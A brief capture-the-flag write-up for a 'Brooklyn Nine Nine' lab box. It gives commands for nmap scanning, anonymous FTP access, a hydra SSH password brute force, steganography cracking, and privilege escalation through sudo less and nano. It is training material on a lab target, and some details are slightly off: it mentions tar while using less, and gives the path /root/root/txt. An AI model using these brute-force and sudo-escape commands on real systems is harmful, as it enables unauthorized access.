# Brooklyn Nine Nine

> thegurpreet | Mar 2021

## Enumeration

Setting ip variable
```
export ip=10.10.76.13
```

Scanning ports using nmap. Found FTP, SSH and HTTP port open

```
sudo nmap -sV -sC $ip
```

## First way to access of box

As per NMAP result above user is ftp and anonymous login is allowed
```
ftp $ip
```

Check available files and download locally to review them
```
dir
get note_to_jake.txt
```

To bruteforce weak password, lets use hydra
```
hydra -l jake -P /usr/share/wordlists/rockyou.txt $ip -t 4 ssh
```

Login with given credentials
```
ssh jake@$ip
```

Check available sudo commands
```
sudo -l
```

Capture user flag
```
less /home/holt/user.txt
```

### Privilege Escalation

Check information about sudo tar on gtfobins
```
sudo less /etc/profile
!/bin/sh
```

Root access!!




## Second way to access of box

Crack passphrase using stegcracker
```
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

Login with given creds
```
ssh jake@$ip
```

Capture user flag


### Privilege Escalation

Check available sudo commands
```
sudo -l
```

Use sudo to read Root flag
```
sudo nano /root/root/txt
```

Root access!!
